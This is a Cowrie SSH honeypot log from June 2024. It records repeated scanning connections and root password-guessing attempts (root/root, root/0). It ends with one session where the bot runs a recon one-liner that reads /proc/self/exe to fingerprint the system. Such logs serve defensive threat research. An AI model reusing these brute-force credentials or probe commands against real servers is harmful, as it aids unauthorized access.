+2024-06-07T11:59:59.709139Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T11:59:59.709229Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:00:27.700723Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:00:27.700939Z [HoneyPotSSHTransport,106,120.82.67.15] Connection lost after 32 seconds
+2024-06-07T12:00:29.557258Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:51938 (172.31.41.134:2222) [session: 8da17d00e510]
+2024-06-07T12:00:32.156978Z [HoneyPotSSHTransport,107,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:00:32.158366Z [HoneyPotSSHTransport,107,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:00:32.159330Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:00:32.159441Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:00:32.159530Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:00:59.901151Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:00:59.901352Z [HoneyPotSSHTransport,107,120.82.67.15] Connection lost after 30 seconds
+2024-06-07T12:01:03.977808Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:57540 (172.31.41.134:2222) [session: e4549b689ee0]
+2024-06-07T12:01:07.696125Z [HoneyPotSSHTransport,108,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:01:07.697637Z [HoneyPotSSHTransport,108,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:01:07.698575Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:01:07.698687Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:01:07.698780Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:01:16.409645Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:01:16.409854Z [HoneyPotSSHTransport,108,120.82.67.15] Connection lost after 12 seconds
+2024-06-07T12:01:16.833463Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:59896 (172.31.41.134:2222) [session: 730586a0bea5]
+2024-06-07T12:01:19.717919Z [HoneyPotSSHTransport,109,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:01:19.719003Z [HoneyPotSSHTransport,109,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:01:19.719946Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:01:19.720052Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:01:19.720152Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:01:41.635728Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:01:41.635932Z [HoneyPotSSHTransport,109,120.82.67.15] Connection lost after 24 seconds
+2024-06-07T12:01:42.333332Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:35124 (172.31.41.134:2222) [session: f490c7076af3]
+2024-06-07T12:01:45.661283Z [HoneyPotSSHTransport,110,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:01:45.662552Z [HoneyPotSSHTransport,110,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:01:45.663695Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:01:45.663799Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:01:45.663933Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:02:04.030063Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:02:04.030264Z [HoneyPotSSHTransport,110,120.82.67.15] Connection lost after 21 seconds
+2024-06-07T12:02:04.756920Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:39564 (172.31.41.134:2222) [session: b4caebe0f2af]
+2024-06-07T12:02:07.703543Z [HoneyPotSSHTransport,111,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:02:07.706052Z [HoneyPotSSHTransport,111,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:02:07.707061Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:02:07.707166Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:02:07.707255Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:02:23.956434Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:02:23.956636Z [HoneyPotSSHTransport,111,120.82.67.15] Connection lost after 19 seconds
+2024-06-07T12:02:25.101429Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:42674 (172.31.41.134:2222) [session: 198ab8dca918]
+2024-06-07T12:02:28.490540Z [HoneyPotSSHTransport,112,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:02:28.492259Z [HoneyPotSSHTransport,112,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:02:28.493227Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:02:28.493332Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:02:28.493420Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:02:55.132742Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:02:55.132958Z [HoneyPotSSHTransport,112,120.82.67.15] Connection lost after 30 seconds
+2024-06-07T12:02:56.699334Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:48264 (172.31.41.134:2222) [session: 5abb3796a5cb]
+2024-06-07T12:03:01.313176Z [HoneyPotSSHTransport,113,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:03:01.315034Z [HoneyPotSSHTransport,113,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:03:01.315979Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:03:01.316099Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:03:01.316202Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:03:26.015496Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:03:26.015699Z [HoneyPotSSHTransport,113,120.82.67.15] Connection lost after 29 seconds
+2024-06-07T12:03:30.104005Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:54820 (172.31.41.134:2222) [session: 679e34dd0a06]
+2024-06-07T12:03:42.699818Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:03:42.700029Z [HoneyPotSSHTransport,114,120.82.67.15] Connection lost after 12 seconds
+2024-06-07T12:03:42.855552Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:57318 (172.31.41.134:2222) [session: 3ffc230b3972]
+2024-06-07T12:03:44.509624Z [HoneyPotSSHTransport,115,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:03:44.511072Z [HoneyPotSSHTransport,115,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:03:44.512032Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:03:44.512137Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:03:44.512226Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:04:09.598670Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:04:09.598874Z [HoneyPotSSHTransport,115,120.82.67.15] Connection lost after 26 seconds
+2024-06-07T12:04:09.834118Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:33142 (172.31.41.134:2222) [session: 67ff8dd0d5ec]
+2024-06-07T12:04:16.334000Z [HoneyPotSSHTransport,116,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:04:16.335808Z [HoneyPotSSHTransport,116,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:04:16.336791Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:04:16.336906Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:04:16.336998Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:04:26.712471Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T12:04:26.713240Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T12:04:33.433084Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:04:33.433310Z [HoneyPotSSHTransport,116,120.82.67.15] Connection lost after 23 seconds
+2024-06-07T12:04:33.998037Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:37352 (172.31.41.134:2222) [session: b2c5bb8a9a87]
+2024-06-07T12:04:39.884839Z [HoneyPotSSHTransport,117,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:04:39.886044Z [HoneyPotSSHTransport,117,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:04:39.887003Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:04:39.887107Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:04:39.887220Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:05:07.686864Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:05:07.687072Z [HoneyPotSSHTransport,117,120.82.67.15] Connection lost after 33 seconds
+2024-06-07T12:05:09.182274Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:42998 (172.31.41.134:2222) [session: 9015a7a1b964]
+2024-06-07T12:05:11.777883Z [HoneyPotSSHTransport,118,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:05:11.779272Z [HoneyPotSSHTransport,118,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:05:11.780235Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:05:11.780343Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:05:11.780431Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:05:31.167758Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:05:31.167967Z [HoneyPotSSHTransport,118,120.82.67.15] Connection lost after 21 seconds
+2024-06-07T12:05:32.818346Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:46750 (172.31.41.134:2222) [session: 5dede141a6ae]
+2024-06-07T12:05:37.744221Z [HoneyPotSSHTransport,119,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:05:37.745918Z [HoneyPotSSHTransport,119,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:05:37.746963Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:05:37.747099Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:05:37.747194Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:05:55.196404Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:05:55.196670Z [HoneyPotSSHTransport,119,120.82.67.15] Connection lost after 22 seconds
+2024-06-07T12:05:57.630210Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:51152 (172.31.41.134:2222) [session: f6826db31575]
+2024-06-07T12:06:00.431184Z [HoneyPotSSHTransport,120,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:06:00.432943Z [HoneyPotSSHTransport,120,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:06:00.433989Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:06:00.434096Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:06:00.434187Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:06:21.146924Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:06:21.147134Z [HoneyPotSSHTransport,120,120.82.67.15] Connection lost after 23 seconds
+2024-06-07T12:06:22.319281Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:56170 (172.31.41.134:2222) [session: be1dbec8fa3f]
+2024-06-07T12:06:25.616381Z [HoneyPotSSHTransport,121,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:06:25.618137Z [HoneyPotSSHTransport,121,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:06:25.619070Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:06:25.619176Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:06:25.619265Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:06:45.276983Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:06:45.277188Z [HoneyPotSSHTransport,121,120.82.67.15] Connection lost after 22 seconds
+2024-06-07T12:06:47.242787Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:59562 (172.31.41.134:2222) [session: 901021c56dd0]
+2024-06-07T12:06:50.743140Z [HoneyPotSSHTransport,122,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:06:50.745092Z [HoneyPotSSHTransport,122,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:06:50.746251Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:06:50.746367Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:06:50.746453Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:07:15.210371Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:07:15.210585Z [HoneyPotSSHTransport,122,120.82.67.15] Connection lost after 27 seconds
+2024-06-07T12:07:17.720170Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:36560 (172.31.41.134:2222) [session: 2186bf31d7f2]
+2024-06-07T12:07:20.859367Z [HoneyPotSSHTransport,123,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:07:20.860775Z [HoneyPotSSHTransport,123,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:07:20.861755Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:07:20.861859Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:07:20.861947Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:07:42.075167Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:07:42.075384Z [HoneyPotSSHTransport,123,120.82.67.15] Connection lost after 24 seconds
+2024-06-07T12:07:42.390610Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:41594 (172.31.41.134:2222) [session: eb1991e52aa5]
+2024-06-07T12:07:45.734440Z [HoneyPotSSHTransport,124,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:07:45.735917Z [HoneyPotSSHTransport,124,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:07:45.736943Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:07:45.737050Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:07:45.737141Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:08:15.786133Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:08:15.786338Z [HoneyPotSSHTransport,124,120.82.67.15] Connection lost after 33 seconds
+2024-06-07T12:08:16.740200Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 120.82.67.15:46924 (172.31.41.134:2222) [session: e7efdedd7e18]
+2024-06-07T12:08:20.538755Z [HoneyPotSSHTransport,125,120.82.67.15] Remote SSH version: SSH-2.0-Go
+2024-06-07T12:08:20.540484Z [HoneyPotSSHTransport,125,120.82.67.15] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T12:08:20.541582Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T12:08:20.541709Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:08:20.541794Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T12:08:32.575507Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T12:08:32.575713Z [HoneyPotSSHTransport,125,120.82.67.15] Connection lost after 15 seconds
+2024-06-07T13:03:16.704247Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 170.64.146.71:45002 (172.31.41.134:2222) [session: b3a930c409a1]
+2024-06-07T13:03:16.707020Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T13:03:16.707132Z [HoneyPotSSHTransport,126,170.64.146.71] Connection lost after 0 seconds
+2024-06-07T14:03:42.418950Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 14.103.39.179:54602 (172.31.41.134:2222) [session: f5badc669d6d]
+2024-06-07T14:03:42.419872Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T14:03:42.419979Z [HoneyPotSSHTransport,127,14.103.39.179] Connection lost after 0 seconds
+2024-06-07T14:03:42.738950Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 14.103.39.179:56062 (172.31.41.134:2222) [session: b71b595cbdcf]
+2024-06-07T14:03:44.084777Z [HoneyPotSSHTransport,128,14.103.39.179] Remote SSH version: SSH-2.0-Go
+2024-06-07T14:03:44.085542Z [HoneyPotSSHTransport,128,14.103.39.179] SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a
+2024-06-07T14:03:44.086515Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256' key alg=b'ecdsa-sha2-nistp256'
+2024-06-07T14:03:44.086644Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T14:03:44.086733Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
+2024-06-07T14:03:44.734492Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T14:03:44.734899Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T14:03:45.884588Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'none'
+2024-06-07T14:03:46.989373Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2024-06-07T14:03:46.989728Z [HoneyPotSSHTransport,128,14.103.39.179] Could not read etc/userdb.txt, default database activated
+2024-06-07T14:03:46.989893Z [HoneyPotSSHTransport,128,14.103.39.179] login attempt [b'root'/b'root'] failed
+2024-06-07T14:03:47.991696Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2024-06-07T14:03:47.991931Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T14:03:48.311847Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T14:03:48.312057Z [HoneyPotSSHTransport,128,14.103.39.179] Connection lost after 5 seconds
+2024-06-07T14:03:48.625326Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 14.103.39.179:60096 (172.31.41.134:2222) [session: 8c10c8a91842]
+2024-06-07T14:04:00.947048Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 14.103.39.179:43804 (172.31.41.134:2222) [session: 2d10da0c2fa2]
+2024-06-07T14:05:48.632290Z [-] Timeout reached in HoneyPotSSHTransport
+2024-06-07T14:05:48.632806Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T14:05:48.632917Z [HoneyPotSSHTransport,129,14.103.39.179] Connection lost after 120 seconds
+2024-06-07T14:06:00.960852Z [-] Timeout reached in HoneyPotSSHTransport
+2024-06-07T14:06:00.961313Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T14:06:00.961421Z [HoneyPotSSHTransport,130,14.103.39.179] Connection lost after 120 seconds
+2024-06-07T14:20:13.046659Z [cowrie.ssh.factory.CowrieSSHFactory] New connection: 121.158.186.165:60869 (172.31.41.134:2222) [session: 2b8a6373e420]
+2024-06-07T14:20:13.191121Z [HoneyPotSSHTransport,131,121.158.186.165] Remote SSH version: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
+2024-06-07T14:20:13.334879Z [HoneyPotSSHTransport,131,121.158.186.165] SSH client hassh fingerprint: 9d31b8e6c87f893d077ca6526f7c710b
+2024-06-07T14:20:13.335799Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'diffie-hellman-group14-sha1' key alg=b'ssh-rsa'
+2024-06-07T14:20:13.335905Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T14:20:13.335996Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha1' b'none'
+2024-06-07T14:20:14.437832Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
+2024-06-07T14:20:14.624816Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T14:20:14.769031Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2024-06-07T14:20:14.769343Z [HoneyPotSSHTransport,131,121.158.186.165] Could not read etc/userdb.txt, default database activated
+2024-06-07T14:20:14.769506Z [HoneyPotSSHTransport,131,121.158.186.165] login attempt [b'root'/b'root'] failed
+2024-06-07T14:20:15.771386Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' failed auth b'password'
+2024-06-07T14:20:15.771647Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()
+2024-06-07T14:20:15.916253Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
+2024-06-07T14:20:16.061129Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' trying auth b'password'
+2024-06-07T14:20:16.061442Z [HoneyPotSSHTransport,131,121.158.186.165] Could not read etc/userdb.txt, default database activated
+2024-06-07T14:20:16.061613Z [HoneyPotSSHTransport,131,121.158.186.165] login attempt [b'root'/b'0'] succeeded
+2024-06-07T14:20:16.062126Z [HoneyPotSSHTransport,131,121.158.186.165] Initialized emulated server as architecture: linux-x64-lsb
+2024-06-07T14:20:16.062454Z [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'root' authenticated with b'password'
+2024-06-07T14:20:16.062649Z [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-connection'
+2024-06-07T14:20:16.364107Z [cowrie.ssh.connection.CowrieSSHConnection#debug] got channel b'session' request
+2024-06-07T14:20:16.364418Z [cowrie.ssh.session.HoneyPotSSHSession#info] channel open
+2024-06-07T14:20:16.512619Z [twisted.conch.ssh.session#info] Getting shell
+2024-06-07T14:20:16.689239Z [HoneyPotSSHTransport,131,121.158.186.165] CMD: ./oinasf; dd if=/proc/self/exe bs=22 count=1 || while read i; do echo $i; done < /proc/self/exe || cat /proc/self/exe;
+2024-06-07T14:20:16.690112Z [HoneyPotSSHTransport,131,121.158.186.165] Command not found: ./oinasf
+2024-06-07T14:20:16.690624Z [HoneyPotSSHTransport,131,121.158.186.165] Command found: dd if=/proc/self/exe bs=22 count=1
+2024-06-07T14:20:16.691440Z [HoneyPotSSHTransport,131,121.158.186.165] Can't find command while
+2024-06-07T14:20:16.691551Z [HoneyPotSSHTransport,131,121.158.186.165] Command not found: while read i
+2024-06-07T14:20:16.692047Z [HoneyPotSSHTransport,131,121.158.186.165] Command found: do echo
+2024-06-07T14:20:16.692367Z [HoneyPotSSHTransport,131,121.158.186.165] Command found: done < /proc/self/exe
+2024-06-07T14:20:16.692752Z [HoneyPotSSHTransport,131,121.158.186.165] Command found: cat /proc/self/exe
+2024-06-07T14:20:17.190873Z [HoneyPotSSHTransport,131,121.158.186.165] Closing TTY Log: var/lib/cowrie/tty/c46ab9e5190dd1178f6d4a698408da212164fa8d1e4bf88a3b724ce3a1777484 after 0 seconds
+2024-06-07T14:20:17.191631Z [HoneyPotSSHTransport,131,121.158.186.165] avatar root logging out
+2024-06-07T14:20:17.191738Z [cowrie.ssh.transport.HoneyPotSSHTransport#info] connection lost
+2024-06-07T14:20:17.191822Z [HoneyPotSSHTransport,131,121.158.186.165] Connection lost after 4 seconds
